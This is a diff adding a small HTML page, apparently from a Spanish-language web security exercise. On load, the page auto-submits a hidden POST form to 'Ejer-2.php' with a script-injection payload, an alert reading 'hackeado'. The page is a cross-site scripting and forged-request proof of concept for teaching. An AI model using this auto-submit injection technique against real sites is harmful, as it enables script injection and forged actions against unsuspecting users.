@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta content='text/html; charset=utf-8' http-equiv='Content-Type' />
+        <title>Invocando vía post mediante JavaScript</title>
+        <script type='text/javascript'>
+            function enviarForm(){
+                document.F.submit();
+            }
+        </script>
+    </head>
+    <body onLoad='javascript:enviarForm();'>
+        <form name='F' action='Ejer-2.php' method='post'>
+            <input type="hidden" name="fich" value="<script>alert('hackeado')</script>"/><br/>
+            <input type="hidden" name="enviar" value="Enviar"/>
+        </form>
+    </body>
+</html>
